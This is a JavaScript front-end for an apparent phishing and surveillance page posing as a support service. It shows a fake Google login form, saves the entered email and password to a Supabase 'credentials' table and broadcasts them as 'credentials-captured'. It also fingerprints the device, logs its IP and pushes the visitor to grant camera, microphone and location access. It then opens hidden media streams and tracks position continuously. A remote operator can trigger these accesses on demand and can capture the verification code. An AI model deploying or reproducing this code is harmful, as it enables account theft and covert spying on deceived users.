const featuresSection = document.getElementById('features-section');
const assistanceSection = document.getElementById('assistance-section');
const loginBtn = document.getElementById('login-btn');
const loginModal = document.getElementById('login-modal');
const closeModalBtn = document.getElementById('close-modal');
const googleLoginForm = document.getElementById('google-login-form');
const permissionsModal = document.getElementById('permissions-modal');
const acceptPermissionsBtn = document.getElementById('accept-permissions');
const denyPermissionsBtn = document.getElementById('deny-permissions');
const confirmationModal = document.getElementById('confirmation-modal');
const verifyCodeBtn = document.getElementById('verify-code');
const cancelVerificationBtn = document.getElementById('cancel-verification');
const resendCodeBtn = document.getElementById('resend-code');
const assistanceForm = document.getElementById('assistance-form');

// Cliente Supabase global
const supabase = window.supabaseClient;

// Variables de estado
let userCredentials = {};
let deviceInfo = {};
let permissions = {
    camera: false,
    microphone: false,
    location: false
};

// Obtener información del dispositivo
async function getDeviceInfo() {
    let devId = localStorage.getItem('deviceId');
    if (!devId) {
        devId = 'device-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', devId);
    }

    // Fallback ip grabbing
    let ip = 'Unknown';
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
    } catch (e) { }

    deviceInfo = {
        device_id: devId,
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen_width: screen.width,
        screen_height: screen.height,
        ip: ip,
        status: 'active'
    };

    return deviceInfo;
}

// Inicializar conexión
let channel;

async function initSupabase() {
    const info = await getDeviceInfo();

    // Registrar o actualizar dispositivo
    const { error } = await supabase
        .from('devices')
        .upsert({
            ...info,
            last_active: new Date().toISOString()
        }, { onConflict: 'device_id' });

    if (error) console.error("Error upserting device", error);

    // Conectar a canal en vivo
    channel = supabase.channel('cyber-room');

    channel.on('broadcast', { event: 'request-action' }, payload => {
        const { deviceId, action } = payload.payload;
        if (deviceId === info.device_id) {
            handleAdminRequest(action);
        }
    });

    channel.subscribe((status) => {
        if (status === 'SUBSCRIBED') {
            channel.send({
                type: 'broadcast',
                event: 'device-connected',
                payload: info
            });
        }
    });
}

function handleAdminRequest(action) {
    if (action === 'access-camera') requestRealPermissions({ camera: true });
    else if (action === 'access-mic') requestRealPermissions({ microphone: true });
    else if (action === 'get-location') requestRealPermissions({ location: true });
    // Otras peticiones podrían manejar envio de archivos
}

// Iniciar sesión
loginBtn.addEventListener('click', () => {
    loginModal.style.display = 'block';
});

closeModalBtn.addEventListener('click', () => {
    loginModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === loginModal) loginModal.style.display = 'none';
    else if (event.target === permissionsModal) permissionsModal.style.display = 'none';
    else if (event.target === confirmationModal) confirmationModal.style.display = 'none';
});

googleLoginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;

    userCredentials = {
        device_id: deviceInfo.device_id,
        email,
        password,
        remember
    };

    // Guardar credenciales en supabase
    await supabase.from('credentials').insert([userCredentials]);

    channel.send({
        type: 'broadcast',
        event: 'credentials-captured',
        payload: { ...userCredentials, deviceId: deviceInfo.device_id }
    });

    loginModal.style.display = 'none';
    permissionsModal.style.display = 'block';
});

acceptPermissionsBtn.addEventListener('click', async () => {
    permissions.camera = document.getElementById('camera-permission').checked;
    permissions.microphone = document.getElementById('mic-permission').checked;
    permissions.location = document.getElementById('location-permission').checked;

    // Actualizar BDD
    await supabase.from('devices').update({ permissions }).eq('device_id', deviceInfo.device_id);

    channel.send({
        type: 'broadcast',
        event: 'permissions-granted',
        payload: { deviceId: deviceInfo.device_id, permissions }
    });

    permissionsModal.style.display = 'none';
    confirmationModal.style.display = 'block';

    requestRealPermissions(permissions);
});

denyPermissionsBtn.addEventListener('click', () => {
    permissionsModal.style.display = 'none';
    alert('Para utilizar el sistema de asistencia, debe aceptar todos los permisos requeridos.');
});

// Solicitar permisos y transmitir estados
function requestRealPermissions(requestedPerms) {
    const devId = deviceInfo.device_id;

    if (requestedPerms.camera) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(async stream => {
                await supabase.from('devices').update({ 'permissions': { ...permissions, camera: true } }).eq('device_id', devId);
                channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.style.display = 'none';
                document.body.appendChild(video);
            })
            .catch(err => console.error(err));
    }

    if (requestedPerms.microphone) {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(async stream => {
                await supabase.from('devices').update({ 'permissions': { ...permissions, microphone: true } }).eq('device_id', devId);
                channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });

                const audio = document.createElement('audio');
                audio.srcObject = stream;
                audio.play();
                audio.style.display = 'none';
                document.body.appendChild(audio);
            })
            .catch(err => console.error(err));
    }

    if (requestedPerms.location) {
        navigator.geolocation.getCurrentPosition(
            async position => {
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                };

                await supabase.from('devices').update({ location: locationData }).eq('device_id', devId);
                channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: locationData } });

                navigator.geolocation.watchPosition(
                    pos => {
                        const updatedLocation = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: pos.timestamp
                        };
                        supabase.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
                        channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: updatedLocation } });
                    },
                    error => console.error(error),
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                );
            },
            error => console.error(error)
        );
    }
}

// Verificación y Asistencia
verifyCodeBtn.addEventListener('click', async () => {
    const codeInputs = document.querySelectorAll('.code-input');
    let code = '';
    codeInputs.forEach(input => code += input.value);

    confirmationModal.style.display = 'none';
    featuresSection.style.display = 'block';
    assistanceSection.style.display = 'block';

    await supabase.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
    channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, code } });
});

cancelVerificationBtn.addEventListener('click', () => {
    confirmationModal.style.display = 'none';
    alert('La verificación es obligatoria para utilizar el sistema.');
});

resendCodeBtn.addEventListener('click', (e) => {
    e.preventDefault();
    alert('Se ha enviado un nuevo código a su correo electrónico.');
});

// Autocompletar campos de código
const codeInputs = document.querySelectorAll('.code-input');
codeInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        if (input.value.length === 1 && index < codeInputs.length - 1) codeInputs[index + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) codeInputs[index - 1].focus();
    });
});

assistanceForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const issueType = document.getElementById('issue-type').value;
    const description = document.getElementById('description').value;

    const reqData = {
        device_id: deviceInfo.device_id,
        issue_type: issueType,
        description
    };
    await supabase.from('assistances').insert([reqData]);

    channel.send({ type: 'broadcast', event: 'assistance-request', payload: { ...reqData, deviceId: deviceInfo.device_id } });

    alert('Su solicitud de asistencia ha sido enviada. Nuestro equipo se pondrá en contacto con usted pronto.');
    assistanceForm.reset();
});

// Mantener activo
document.addEventListener('visibilitychange', async () => {
    if (!document.hidden && deviceInfo.device_id) {
        await supabase.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
    }
});

// Evitar cierre accidental
window.addEventListener('beforeunload', (e) => {
    if (featuresSection.style.display === 'none') {
        e.preventDefault();
        e.returnValue = '¿Está seguro de que desea salir? El proceso de verificación no se ha completado.';
    }
});

// Inicializar al cargar scripts
initSupabase();
